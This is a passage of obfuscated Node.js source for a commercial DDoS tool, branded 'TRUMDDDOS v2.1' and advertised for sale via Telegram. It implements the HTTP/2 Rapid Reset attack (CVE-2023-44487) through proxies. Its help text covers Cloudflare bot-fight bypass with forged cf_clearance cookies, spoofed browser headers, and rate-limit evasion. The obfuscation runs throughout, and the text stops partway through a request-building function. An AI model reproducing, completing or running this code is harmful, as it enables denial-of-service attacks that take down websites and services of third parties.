//Mua Tool ddos vip có bypass Vip liên hệ telegram: @trumddos
const a0_0x568c87 = a0_0x3db5;
(function(_0x634af7, _0x34ce9b) {
    const _0x3f5308 = a0_0x3db5,
        _0x51c786 = _0x634af7();
    while (!![]) {
        try {
            const _0x5cc122 = parseInt(_0x3f5308(0x265)) / 0x1 * (parseInt(_0x3f5308(0x1cf)) / 0x2) + -parseInt(_0x3f5308(0x1ca)) / 0x3 * (-parseInt(_0x3f5308(0x21e)) / 0x4) + -parseInt(_0x3f5308(0x19a)) / 0x5 * (parseInt(_0x3f5308(0x224)) / 0x6) + parseInt(_0x3f5308(0x185)) / 0x7 * (parseInt(_0x3f5308(0x239)) / 0x8) + -parseInt(_0x3f5308(0x226)) / 0x9 + -parseInt(_0x3f5308(0x1d3)) / 0xa + parseInt(_0x3f5308(0x210)) / 0xb;
            if (_0x5cc122 === _0x34ce9b) break;
            else _0x51c786['push'](_0x51c786['shift']());
        } catch (_0x68785) {
            _0x51c786['push'](_0x51c786['shift']());
        }
    }
}(a0_0x4b68, 0xe175e));
const net = require(a0_0x568c87(0x24d)),
    tls = require(a0_0x568c87(0x191)),
    HPACK = require(a0_0x568c87(0x1cd)),
    cluster = require(a0_0x568c87(0x1fa)),
    fs = require('fs'),
    os = require('os'),
    crypto = require(a0_0x568c87(0x1ec)),
    {
        exec
    } = require(a0_0x568c87(0x1ad)),
    ignoreNames = [a0_0x568c87(0x263), a0_0x568c87(0x23d), 'CaptchaError', a0_0x568c87(0x225), a0_0x568c87(0x1c2), a0_0x568c87(0x1a9), a0_0x568c87(0x244), a0_0x568c87(0x1e7), 'URLError', a0_0x568c87(0x23b), a0_0x568c87(0x19d)],
    ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', a0_0x568c87(0x233), 'ERR_ASSERTION', a0_0x568c87(0x1b0), 'EPIPE', a0_0x568c87(0x26d), a0_0x568c87(0x22c), a0_0x568c87(0x1be), 'EPROTO', a0_0x568c87(0x1a2), 'EHOSTDOWN', a0_0x568c87(0x24e), a0_0x568c87(0x221), a0_0x568c87(0x1d8), 'ENOTCONN', a0_0x568c87(0x219), a0_0x568c87(0x1e9), a0_0x568c87(0x1f2), a0_0x568c87(0x1bb), 'EAFNOSUPPORT', a0_0x568c87(0x1c5), a0_0x568c87(0x241), 'ECONNABORTED', a0_0x568c87(0x256), a0_0x568c87(0x254), a0_0x568c87(0x193), a0_0x568c87(0x26d), 'EIDRM', a0_0x568c87(0x195), a0_0x568c87(0x1eb), 'EINTR', a0_0x568c87(0x1c8), a0_0x568c87(0x271), 'EISCONN', a0_0x568c87(0x217), a0_0x568c87(0x220), a0_0x568c87(0x1fc), 'ENAMETOOLONG', a0_0x568c87(0x1f0), 'ENOBUFS', a0_0x568c87(0x1c3), a0_0x568c87(0x214), 'ENOMEM', 'ENOPROTOOPT', a0_0x568c87(0x26f), a0_0x568c87(0x1f8), 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', a0_0x568c87(0x1a3), a0_0x568c87(0x19c), a0_0x568c87(0x251), a0_0x568c87(0x24c), a0_0x568c87(0x18e), a0_0x568c87(0x25c), a0_0x568c87(0x1b3), a0_0x568c87(0x1b9), a0_0x568c87(0x248), a0_0x568c87(0x269), 'ETXTBSY', a0_0x568c87(0x218), 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', a0_0x568c87(0x25b), a0_0x568c87(0x25a), a0_0x568c87(0x21f), a0_0x568c87(0x1a1)];
require(a0_0x568c87(0x194))[a0_0x568c87(0x1ba)]['defaultMaxListeners'] = Number[a0_0x568c87(0x1c6)], process[a0_0x568c87(0x19b)](0x0)['on']('uncaughtException', function(_0x3d1ac9) {
    const _0x42db36 = a0_0x568c87;
    console[_0x42db36(0x1ed)](_0x3d1ac9);
    if (_0x3d1ac9[_0x42db36(0x1f7)] && ignoreCodes[_0x42db36(0x1cb)](_0x3d1ac9['code']) || _0x3d1ac9[_0x42db36(0x20d)] && ignoreNames[_0x42db36(0x1cb)](_0x3d1ac9[_0x42db36(0x20d)])) return ![];
})['on'](a0_0x568c87(0x230), function(_0xfa30fb) {
    const _0x6a6ab3 = a0_0x568c87;
    if (_0xfa30fb[_0x6a6ab3(0x1f7)] && ignoreCodes[_0x6a6ab3(0x1cb)](_0xfa30fb[_0x6a6ab3(0x1f7)]) || _0xfa30fb['name'] && ignoreNames[_0x6a6ab3(0x1cb)](_0xfa30fb[_0x6a6ab3(0x20d)])) return ![];
})['on'](a0_0x568c87(0x262), _0x26dbd4 => {
    const _0x1d8ef0 = a0_0x568c87;
    if (_0x26dbd4['code'] && ignoreCodes[_0x1d8ef0(0x1cb)](_0x26dbd4[_0x1d8ef0(0x1f7)]) || _0x26dbd4[_0x1d8ef0(0x20d)] && ignoreNames[_0x1d8ef0(0x1cb)](_0x26dbd4['name'])) return ![];
})['on'](a0_0x568c87(0x25e), () => {
    return 0x1;
})['on'](a0_0x568c87(0x201), () => {
    return 0x1;
});
const statusesQ = [];
let statuses = {},
    isFull = process[a0_0x568c87(0x1ee)][a0_0x568c87(0x1cb)]('--full'),
    custom_table = 0xffff,
    custom_window = 0x600000,
    custom_header = 0x40000,
    custom_update = 0xef0001,
    timer = 0x0;
const blockedDomain = [a0_0x568c87(0x1a8), a0_0x568c87(0x1d9)],
    timestamp = Date[a0_0x568c87(0x1ea)](),
    timestampString = timestamp[a0_0x568c87(0x1ae)]()[a0_0x568c87(0x1b7)](0x0, 0xa),
    currentDate = new Date(),
    targetDate = new Date(a0_0x568c87(0x187)),
    PREFACE = a0_0x568c87(0x216),
    reqmethod = process[a0_0x568c87(0x1ee)][0x2],
    target = process[a0_0x568c87(0x1ee)][0x3],
    time = process[a0_0x568c87(0x1ee)][0x4],
    threads = process[a0_0x568c87(0x1ee)][0x5],
    ratelimit = process[a0_0x568c87(0x1ee)][0x6],
    proxyfile = process[a0_0x568c87(0x1ee)][0x7],
    queryIndex = process[a0_0x568c87(0x1ee)][a0_0x568c87(0x1cc)]('--query'),
    query = queryIndex !== -0x1 && queryIndex + 0x1 < process[a0_0x568c87(0x1ee)][a0_0x568c87(0x260)] ? process[a0_0x568c87(0x1ee)][queryIndex + 0x1] : undefined,
    bfmFlagIndex = process[a0_0x568c87(0x1ee)][a0_0x568c87(0x1cc)](a0_0x568c87(0x20e)),
    bfmFlag = bfmFlagIndex !== -0x1 && bfmFlagIndex + 0x1 < process[a0_0x568c87(0x1ee)][a0_0x568c87(0x260)] ? process['argv'][bfmFlagIndex + 0x1] : undefined,
    delayIndex = process[a0_0x568c87(0x1ee)][a0_0x568c87(0x1cc)](a0_0x568c87(0x20c)),
    delay = delayIndex !== -0x1 && delayIndex + 0x1 < process[a0_0x568c87(0x1ee)][a0_0x568c87(0x260)] ? parseInt(process[a0_0x568c87(0x1ee)][delayIndex + 0x1]) : 0x0,
    cookieIndex = process[a0_0x568c87(0x1ee)]['indexOf'](a0_0x568c87(0x231)),
    cookieValue = cookieIndex !== -0x1 && cookieIndex + 0x1 < process[a0_0x568c87(0x1ee)][a0_0x568c87(0x260)] ? process[a0_0x568c87(0x1ee)][cookieIndex + 0x1] : undefined,
    refererIndex = process[a0_0x568c87(0x1ee)][a0_0x568c87(0x1cc)](a0_0x568c87(0x21d)),
    refererValue = refererIndex !== -0x1 && refererIndex + 0x1 < process[a0_0x568c87(0x1ee)][a0_0x568c87(0x260)] ? process[a0_0x568c87(0x1ee)][refererIndex + 0x1] : undefined,
    postdataIndex = process['argv'][a0_0x568c87(0x1cc)](a0_0x568c87(0x202)),
    postdata = postdataIndex !== -0x1 && postdataIndex + 0x1 < process['argv']['length'] ? process[a0_0x568c87(0x1ee)][postdataIndex + 0x1] : undefined,
    randrateIndex = process['argv'][a0_0x568c87(0x1cc)](a0_0x568c87(0x207)),
    randrate = randrateIndex !== -0x1 && randrateIndex + 0x1 < process['argv'][a0_0x568c87(0x260)] ? process[a0_0x568c87(0x1ee)][randrateIndex + 0x1] : undefined,
    customHeadersIndex = process[a0_0x568c87(0x1ee)][a0_0x568c87(0x1cc)](a0_0x568c87(0x1d0)),
    customHeaders = customHeadersIndex !== -0x1 && customHeadersIndex + 0x1 < process['argv']['length'] ? process[a0_0x568c87(0x1ee)][customHeadersIndex + 0x1] : undefined,
    customIPindex = process[a0_0x568c87(0x1ee)][a0_0x568c87(0x1cc)]('--ip'),
    customIP = customIPindex !== -0x1 && customIPindex + 0x1 < process[a0_0x568c87(0x1ee)][a0_0x568c87(0x260)] ? process['argv'][customIPindex + 0x1] : undefined,
    customUAindex = process[a0_0x568c87(0x1ee)][a0_0x568c87(0x1cc)](a0_0x568c87(0x232)),
    customUA = customUAindex !== -0x1 && customUAindex + 0x1 < process[a0_0x568c87(0x1ee)]['length'] ? process['argv'][customUAindex + 0x1] : undefined,
    forceHttpIndex = process[a0_0x568c87(0x1ee)][a0_0x568c87(0x1cc)](a0_0x568c87(0x19f)),
    useLegitHeaders = process[a0_0x568c87(0x1ee)][a0_0x568c87(0x1cb)]('--legit'),
    forceHttp = forceHttpIndex !== -0x1 && forceHttpIndex + 0x1 < process[a0_0x568c87(0x1ee)][a0_0x568c87(0x260)] ? process[a0_0x568c87(0x1ee)][forceHttpIndex + 0x1] == a0_0x568c87(0x1c9) ? undefined : parseInt(process[a0_0x568c87(0x1ee)][forceHttpIndex + 0x1]) : '2',
    debugMode = process[a0_0x568c87(0x1ee)][a0_0x568c87(0x1cb)](a0_0x568c87(0x23e)) && forceHttp != 0x1;
(!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) && (console['clear'](), console[a0_0x568c87(0x249)](a0_0x568c87(0x22f) + process[a0_0x568c87(0x1ee)][0x1] + '\x20<GET/POST>\x20<target>\x20<time>\x20<threads>\x20<ratelimit>\x20<proxy>\x0a\x20\x20\x20\x20\x20\x20node\x20' + process['argv'][0x1] + a0_0x568c87(0x1e3)), process[a0_0x568c87(0x237)](0x1));
let hcookie = '';
const url = new URL(target),
    proxy = fs[a0_0x568c87(0x1b5)](proxyfile, 'utf8')[a0_0x568c87(0x212)](/\r/g, '')[a0_0x568c87(0x1fb)]('\x0a');
url[a0_0x568c87(0x24f)]['endsWith'](blockedDomain) && (console[a0_0x568c87(0x1ed)]('Domain\x20' + blockedDomain + a0_0x568c87(0x26b)), process[a0_0x568c87(0x237)](0x1));
![a0_0x568c87(0x245), a0_0x568c87(0x188), a0_0x568c87(0x242), a0_0x568c87(0x257)][a0_0x568c87(0x1cb)](reqmethod) && (console[a0_0x568c87(0x249)](a0_0x568c87(0x22d)), process[a0_0x568c87(0x237)](0x1));
!target['startsWith'](a0_0x568c87(0x208)) && !target[a0_0x568c87(0x22a)]('http://') && (console[a0_0x568c87(0x249)](a0_0x568c87(0x1f3)), process[a0_0x568c87(0x237)](0x1));
(isNaN(time) || time <= 0x0) && (console[a0_0x568c87(0x249)](a0_0x568c87(0x227)), process['exit'](0x1));
(isNaN(threads) || threads <= 0x0 || threads > 0x100) && (console['error'](a0_0x568c87(0x190)), process[a0_0x568c87(0x237)](0x1));
(isNaN(ratelimit) || ratelimit <= 0x0 || ratelimit > 0x5a) && (console[a0_0x568c87(0x249)](a0_0x568c87(0x1f1)), process['exit'](0x1));
bfmFlag && bfmFlag['toLowerCase']() === 'true' && (hcookie = 'cf_clearance=' + randstr(0x16) + '_' + randstr(0x1) + '.' + randstr(0x3) + '.' + randstr(0xe) + '-' + timestampString + a0_0x568c87(0x203) + randstr(0x6) + '+' + randstr(0x50) + '=');
cookieValue && (cookieValue === a0_0x568c87(0x259) ? hcookie = hcookie ? hcookie + ';\x20' + ememmmmmemmeme(0x6, 0x6) : ememmmmmemmeme(0x6, 0x6) : hcookie = hcookie ? hcookie + ';\x20' + cookieValue : cookieValue);

function encodeFrame(_0x42b775, _0x1396f7, _0x446579 = '', _0x4f4472 = 0x0) {
    const _0x29482a = a0_0x568c87;
    let _0x2f6bda = Buffer['alloc'](0x9);
    _0x2f6bda[_0x29482a(0x197)](_0x446579[_0x29482a(0x260)] << 0x8 | _0x1396f7, 0x0), _0x2f6bda[_0x29482a(0x26c)](_0x4f4472, 0x4), _0x2f6bda['writeUInt32BE'](_0x42b775, 0x5);
    if (_0x446579['length'] > 0x0) _0x2f6bda = Buffer[_0x29482a(0x1e5)]([_0x2f6bda, _0x446579]);
    return _0x2f6bda;
}

function decodeFrame(_0x421aa1) {
    const _0x5674bb = a0_0x568c87,
        _0x421e58 = _0x421aa1[_0x5674bb(0x1e0)](0x0),
        _0x1d4458 = _0x421e58 >> 0x8,
        _0x97c2e9 = _0x421e58 & 0xff,
        _0x3f0857 = _0x421aa1['readUint8'](0x4),
        _0x1b4c43 = _0x421aa1[_0x5674bb(0x1e0)](0x5),
        _0x5db450 = _0x3f0857 & 0x20 ? 0x5 : 0x0;
    let _0x3b5c97 = Buffer[_0x5674bb(0x25d)](0x0);
    if (_0x1d4458 > 0x0) {
        _0x3b5c97 = _0x421aa1[_0x5674bb(0x1aa)](0x9 + _0x5db450, 0x9 + _0x5db450 + _0x1d4458);
        if (_0x3b5c97[_0x5674bb(0x260)] + _0x5db450 != _0x1d4458) return null;
    }
    return {
        'streamId': _0x1b4c43,
        'length': _0x1d4458,
        'type': _0x97c2e9,
        'flags': _0x3f0857,
        'payload': _0x3b5c97
    };
}

function encodeSettings(_0xffd4a8) {
    const _0x1fdcff = a0_0x568c87,
        _0xad73c9 = Buffer['alloc'](0x6 * _0xffd4a8[_0x1fdcff(0x260)]);
    for (let _0x1d285b = 0x0; _0x1d285b < _0xffd4a8[_0x1fdcff(0x260)]; _0x1d285b++) {
        _0xad73c9[_0x1fdcff(0x1fd)](_0xffd4a8[_0x1d285b][0x0], _0x1d285b * 0x6), _0xad73c9[_0x1fdcff(0x197)](_0xffd4a8[_0x1d285b][0x1], _0x1d285b * 0x6 + 0x2);
    }
    return _0xad73c9;
}

function encodeRstStream(_0x2f7331, _0x548f84, _0x72926d) {
    const _0x57fd3c = a0_0x568c87,
        _0x32b1c4 = Buffer[_0x57fd3c(0x25d)](0x9);
    _0x32b1c4['writeUInt32BE'](0x4, 0x0), _0x32b1c4[_0x57fd3c(0x26c)](_0x548f84, 0x4), _0x32b1c4[_0x57fd3c(0x26c)](_0x72926d, 0x5), _0x32b1c4[_0x57fd3c(0x197)](_0x2f7331, 0x5);
    const _0x1039b0 = Buffer[_0x57fd3c(0x25d)](0x4)[_0x57fd3c(0x234)](0x0);
    return Buffer['concat']([_0x32b1c4, _0x1039b0]);
}
const getRandomChar = () => {
    const _0x29947e = a0_0x568c87,
        _0x269fa6 = _0x29947e(0x235),
        _0x43f4db = Math[_0x29947e(0x1ce)](Math[_0x29947e(0x1d5)]() * _0x269fa6['length']);
    return _0x269fa6[_0x43f4db];
};

function a0_0x4b68() {
    const _0x47914f = ['destroy', 'Brave', '--delay', 'name', '--bfm', 'CONNECT\x20', '13690820iPAtgk', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-', 'replace', 'charAt', 'ENOENT', 'SSL_OP_NO_TICKET', 'PRI\x20*\x20HTTP/2.0\x0d\x0a\x0d\x0aSM\x0d\x0a\x0d\x0a', 'EMFILE', 'EXDEV', 'ENOTFOUND', 'encode', 'state', 'User-Agent:\x20', '--referer', '6708LmFUZu', 'CERT_NOT_YET_VALID', 'EMLINK', 'ENETUNREACH', 'setTableSize', 'SSL_OP_NO_SSLv2', '121248rmHeJj', 'CloudflareError', '5495301PrzKCn', 'Error\x20time\x20can\x20not\x20high\x2086400', 'Cache-Control:\x20max-age=0\x0d\x0a', 'SSLcom', 'startsWith', 'x-client-session', 'ETIMEDOUT', 'Error\x20request\x20method\x20only\x20can\x20GET/POST/HEAD/OPTIONS', 'trim', '\x0a\x20\x20\x20\x20TORNADO\x20v2.1\x20Method\x20With\x20RST\x20STREAM\x20(CVE-2023-44487)\x20//\x20Updated:\x2001.05.2024\x20//\x20With\x20love\x20@resetcve\x0a\x20\x20\x20\x20Developers\x20to\x20method:\x20@resetcve\x20-\x20developer\x20method\x20//\x20@shiftwise\x20-\x20recoding\x20method\x0a\x20\x20\x20\x20How\x20to\x20use\x20&\x20example:\x0a\x20\x20\x20\x20\x20\x20node\x20', 'unhandledRejection', '--cookie', '--useragent', 'ECONNRESET', 'fill', 'abcdefghijklmnopqrstuvwxyz', 'undefined', 'exit', 'binary', '832jZNEbr', 'cross-site', 'InvalidURL', '\x22Not\x20A(Brand\x22;v=\x2299\x22,\x20\x22', 'StatusCodeError', '--debug', '\x22Chromium\x22;v=\x22', 'en-US,en;q=0.9', 'EBADF', 'HEAD', 'sudo\x20sysctl\x20-w\x20net.ipv4.tcp_congestion_control=', 'TimeoutError', 'GET', 'GOAWAY', 'SSL_OP_NO_RENEGOTIATION', 'ESRCH', 'error', 'en-US,en;q=0.6', 'cubic', 'EPROTONOSUPPORT', 'net', 'ENETRESET', 'hostname', '10.0.0', 'EPIPE', '\x20net.ipv4.tcp_sack=', 'Sec-Fetch-Dest:\x20document\x0d\x0a', 'EDQUOT', '\x22;v=\x22', 'EDESTADDRREQ', 'OPTIONS', 'cpus', '%RAND%', 'CERT_HAS_EXPIRED', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'EROFS', 'alloc', 'SIGHUP', 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/', 'length', '?__cf_chl_rt_tk=', 'warning', 'RequestError', 'same-origin', '2162RSxcHt', '\x22,\x20\x22', 'Upgrade-Insecure-Requests:\x201\x0d\x0a', 'pathname', 'ETIME', 'flags', '\x20blocked,\x20if\x20this\x20mistake\x20pm\x20to\x20tg\x20@rapidreset', 'writeUInt8', 'EHOSTUNREACH', 'entries', 'ENOSPC', 'connect', 'EIO', '89873HGdXQU', 'Referer:\x20', '2024-03-30', 'POST', 'http/1.1', 'isMaster', 'host', 'sec-ch-ua-platform:\x20\x22Windows\x22\x0d\x0a', '-0-', 'ERANGE', 'fork', 'Error\x20threads\x20can\x20not\x20high\x20256', 'tls', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'EFAULT', 'events', 'EILSEQ', 'max-age=0', 'writeUInt32BE', 'Google\x20Chrome', 'SSL_OP_ALL', '385pssdpr', 'setMaxListeners', 'EPERM', 'ProxyError', 'push', '--http', '1.1.1.1:3128', 'ERR_SOCKET_BAD_PORT', 'EAI_AGAIN', 'EOPNOTSUPP', 'end', ':443\x0d\x0aProxy-Connection:\x20Keep-Alive\x0d\x0a\x0d\x0a', 'data', '\x22,\x20\x22Chromium\x22;v=\x22', '.gov', 'ParserError', 'subarray', 'close', 'once', 'child_process', 'toString', 'https', 'ECONNREFUSED', 'toLocaleString', 'online', 'ESHUTDOWN', 'find', 'readFileSync', ':443\x20HTTP/1.1\x0d\x0aHost:\x20', 'substring', 'SSL_OP_TLSEXT_PADDING', 'ESPIPE', 'EventEmitter', 'EADDRNOTAVAIL', '\x20net.ipv4.tcp_timestamps=', 'write', 'ESOCKETTIMEDOUT', 'x-request-data', '\x20net.ipv4.tcp_fastopen=', 'alpnProtocol', 'ParseError', 'ENODEV', 'reduce', 'EALREADY', 'MAX_VALUE', '\x22,\x20\x22Not:A-Brand\x22;v=\x228\x22,\x20\x22Chromium\x22;v=\x22', 'EINVAL', 'mix', '2109EFcBgR', 'includes', 'indexOf', 'hpack', 'floor', '162SHiWhL', '--header', 'destroyed', 'Sec-Fetch-Mode:\x20navigate\x0d\x0a', '8438380gWLXyX', 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256', 'random', 'decode', 'constants', 'ENONET', '.edu', 'Host:\x20', '\x22Not_A\x20Brand\x22;v=\x228\x22,\x20\x22Chromium\x22;v=\x22', 'en-US,en;q=0.7', 'SSL_OP_NO_SSLv3', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', 'shift', 'readUInt32BE', ':status', 'Sec-Fetch-Site:\x20none\x0d\x0a', '\x20GET\x20\x22https://target.com?q=%RAND%\x22\x20120\x2016\x2090\x20proxy.txt\x20--query\x201\x20--cookie\x20\x22uh=good\x22\x20--delay\x201\x20--bfm\x20true\x20--referer\x20rand\x20--postdata\x20\x22user=f&pass=%RAND%\x22\x20--debug\x20--randrate\x20--full\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20Options:\x0a\x20\x20\x20\x20\x20\x20--query\x201/2/3\x20-\x20query\x20string\x20with\x20rand\x20ex\x201\x20-\x20?cf__chl_tk\x202\x20-\x20?fwfwfwfw\x203\x20-\x20?q=fwfwwffw\x0a\x20\x20\x20\x20\x20\x20--delay\x20<1-1000>\x20-\x20delay\x20between\x20requests\x201-100\x20ms\x20(optimal)\x20default\x201\x20ms\x0a\x20\x20\x20\x20\x20\x20--cookie\x20\x22f=f\x22\x20-\x20for\x20custom\x20cookie\x20-\x20also\x20cookie\x20support\x20%RAND%\x20ex:\x20\x22bypassing=%RAND%\x22\x0a\x20\x20\x20\x20\x20\x20--bfm\x20true/null\x20-\x20bot\x20fight\x20mode\x20change\x20to\x20true\x20if\x20you\x20need\x20dont\x20use\x20if\x20no\x20need\x0a\x20\x20\x20\x20\x20\x20--referer\x20https://target.com\x20/\x20rand\x20-\x20use\x20custom\x20referer\x20if\x20you\x20need\x20and\x20rand\x20-\x20if\x20you\x20need\x20generate\x20domains\x20ex:\x20fwfwwfwfw.net\x0a\x20\x20\x20\x20\x20\x20--postdata\x20\x22user=f&pass=%RAND%\x22\x20-\x20if\x20you\x20need\x20data\x20to\x20post\x20req\x20method\x20format\x20\x22user=f&pass=f\x22\x0a\x20\x20\x20\x20\x20\x20--randrate\x20-\x20randomizer\x20rate\x201\x20to\x2090\x20good\x20bypass\x20to\x20rate\x0a\x20\x20\x20\x20\x20\x20--full\x20-\x20this\x20new\x20func\x20for\x20attack\x20only\x20big\x20backend\x20ex\x20amazon\x20akamai\x20and\x20other...\x20support\x20cf\x0a\x20\x20\x20\x20\x20\x20--http\x201/2/mix\x20-\x20new\x20func\x20choose\x20to\x20type\x20http\x201/2/mix\x20(mix\x201\x20&\x202)\x0a\x20\x20\x20\x20\x20\x20--debug\x20-\x20show\x20your\x20status\x20code\x20(maybe\x20low\x20rps\x20to\x20use\x20more\x20resource)\x0a\x20\x20\x20\x20\x20\x20--header\x20\x22f:f\x22\x20or\x20\x22f:f#f1:f1\x22\x20-\x20if\x20you\x20need\x20this\x20use\x20custom\x20headers\x20split\x20each\x20header\x20with\x20#\x0a\x20\x20\x20\x20\x20\x20--legit\x20-\x20this\x20new\x20func\x20for\x20attack\x20with\x20full\x20legit\x20headers\x20non\x20for\x20cf\x0a\x20\x20\x20\x20', 'navigate', 'concat', 'filter', 'JSONError', 'none', 'EAI_NODATA', 'now', 'EINPROGRESS', 'crypto', 'log', 'argv', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'ENETDOWN', 'Error\x20ratelimit\x20can\x20not\x20high\x2090', 'EAI_NONAME', 'Error\x20protocol\x20can\x20only\x20https://\x20or\x20http://', '\x0a╔════════════════════════════════════════════════════╗\x0a║\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20🚀\x20TRUMDDDOS\x20v2.1\x20DDoS\x20TOOL\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20║\x0a║\x20\x20\x20\x20CVE-2023-44487\x20RST\x20STREAM\x20/\x20HTTP2\x20Exploit\x20\x20\x20\x20\x20\x20\x20║\x0a║\x20\x20\x20\x20Updated:\x2001.05.2024\x20|\x20Made\x20with\x20❤️\x20by\x20@Trumddos\x20\x20║\x0a╚════════════════════════════════════════════════════╝\x0a\x20\x20\x20\x20', 'same-site', 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384', 'code', 'ENOSYS', 'document', 'cluster', 'split', 'EMSGSIZE', 'writeUInt16BE', 'clear', '🚀\x20ĐANG\x20DDOS\x20➜\x20', '\x22,\x20\x22Not(A:Brand\x22;v=\x2224\x22,\x20\x22', 'SIGCHILD', '--postdata', '-1.0-', 'gaNy', '.0.0.0\x20Safari/537.36', 'type', '--randrate', 'https://', 'from'];
    a0_0x4b68 = function() {
        return _0x47914f;
    };
    return a0_0x4b68();
}

function randstr(_0x30abdf) {
    const _0x454f4e = a0_0x568c87,
        _0x5e789d = _0x454f4e(0x1de);
    let _0x251537 = '';
    const _0x515862 = _0x5e789d['length'];
    for (let _0xb6257a = 0x0; _0xb6257a < _0x30abdf; _0xb6257a++) {
        _0x251537 += _0x5e789d['charAt'](Math[_0x454f4e(0x1ce)](Math[_0x454f4e(0x1d5)]() * _0x515862));
    }
    return _0x251537;
}

function a0_0x3db5(_0x1382c1, _0x54db03) {
    const _0x4b68c7 = a0_0x4b68();
    return a0_0x3db5 = function(_0x3db56f, _0x4f57a8) {
        _0x3db56f = _0x3db56f - 0x185;
        let _0x2bf0d1 = _0x4b68c7[_0x3db56f];
        return _0x2bf0d1;
    }, a0_0x3db5(_0x1382c1, _0x54db03);
}
if (url[a0_0x568c87(0x268)][a0_0x568c87(0x1cb)](a0_0x568c87(0x259))) {
    const randomValue = randstr(0x6) + '&' + randstr(0x6);
    url[a0_0x568c87(0x268)] = url['pathname'][a0_0x568c87(0x212)](a0_0x568c87(0x259), randomValue);
}

function randstrr(_0x383016) {
    const _0x38a727 = a0_0x568c87,
        _0x56f464 = _0x38a727(0x211);
    let _0x151b82 = '';
    const _0x29ebfa = _0x56f464[_0x38a727(0x260)];
    for (let _0xb025f0 = 0x0; _0xb025f0 < _0x383016; _0xb025f0++) {
        _0x151b82 += _0x56f464[_0x38a727(0x213)](Math['floor'](Math[_0x38a727(0x1d5)]() * _0x29ebfa));
    }
    return _0x151b82;
}

function generateRandomString(_0x29ecfc, _0x507e8b) {
    const _0x1df207 = a0_0x568c87,
        _0x5b950d = _0x1df207(0x1de),
        _0x54c221 = Math[_0x1df207(0x1ce)](Math[_0x1df207(0x1d5)]() * (_0x507e8b - _0x29ecfc + 0x1)) + _0x29ecfc;
    let _0x57c46c = '';
    for (let _0x1f6a77 = 0x0; _0x1f6a77 < _0x54c221; _0x1f6a77++) {
        const _0x14764a = Math[_0x1df207(0x1ce)](Math[_0x1df207(0x1d5)]() * _0x5b950d['length']);
        _0x57c46c += _0x5b950d[_0x14764a];
    }
    return _0x57c46c;
}

function ememmmmmemmeme(_0xe94c29, _0x3391f6) {
    const _0x106dd1 = a0_0x568c87,
        _0x48c478 = _0x106dd1(0x235),
        _0x4af918 = Math['floor'](Math[_0x106dd1(0x1d5)]() * (_0x3391f6 - _0xe94c29 + 0x1)) + _0xe94c29;
    let _0x568b04 = '';
    for (let _0x355456 = 0x0; _0x355456 < _0x4af918; _0x355456++) {
        const _0x11543d = Math[_0x106dd1(0x1ce)](Math[_0x106dd1(0x1d5)]() * _0x48c478[_0x106dd1(0x260)]);
        _0x568b04 += _0x48c478[_0x11543d];
    }
    return _0x568b04;
}

function getRandomInt(_0x274799, _0x3046cb) {
    const _0x41bcdd = a0_0x568c87;
    return Math[_0x41bcdd(0x1ce)](Math[_0x41bcdd(0x1d5)]() * (_0x3046cb - _0x274799 + 0x1)) + _0x274799;
}

function buildRequest() {
    const _0x2a830d = a0_0x568c87,
        _0x2e1ff1 = getRandomInt(0x78, 0x7b),
        _0x365426 = [_0x2a830d(0x198), _0x2a830d(0x20b)],
        _0x2e090c = _0x365426[Math['floor'](Math['random']() * _0x365426[_0x2a830d(0x260)])];
    let _0x20cade;
    if (_0x2e1ff1 === 0x78) _0x20cade = _0x2a830d(0x1db) + _0x2e1ff1 + _0x2a830d(0x266) + _0x2e090c + '\x22;v=\x22' + _0x2e1ff1 + '\x22';
    else {
        if (_0x2e1ff1 === 0x79) _0x20cade = _0x2a830d(0x23c) + _0x2e090c + _0x2a830d(0x255) + _0x2e1ff1 + _0x2a830d(0x1a7) + _0x2e1ff1 + '\x22';
        else {
            if (_0x2e1ff1 === 0x7a) _0x20cade = _0x2a830d(0x23f) + _0x2e1ff1 + _0x2a830d(0x200) + _0x2e090c + '\x22;v=\x22' + _0x2e1ff1 + '\x22';
            else _0x2e1ff1 === 0x7b && (_0x20cade = '\x22' + _0x2e090c + _0x2a830d(0x255) + _0x2e1ff1 + _0x2a830d(0x1c7) + _0x2e1ff1 + '\x22');
        }
    }
    const _0x357540 = _0x2e090c === 'Brave',
        _0x20bfef = _0x357540 ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' : _0x2a830d(0x192),
        _0x2790d1 = _0x357540 ? _0x2a830d(0x24a) : _0x2a830d(0x1dc),
        _0x56e852 = _0x2a830d(0x25f) + _0x2e1ff1 + _0x2a830d(0x205),
        _0xd413ed = '' + _0x20cade,
        _0x354767 = refererValue === 'rand' ? _0x2a830d(0x208) + ememmmmmemmeme(0x6, 0x6) + '.net' : refererValue;
    let _0xb8de13 = '\x0d\x0a',
        _0x2e00f7 = '\x0d\x0a';
    hcookie || _0x354767 ? (_0xb8de13 = '\x0d\x0a', _0x2e00f7 = '') : (_0xb8de13 = '', _0x2e00f7 = '\x0d\x0a');
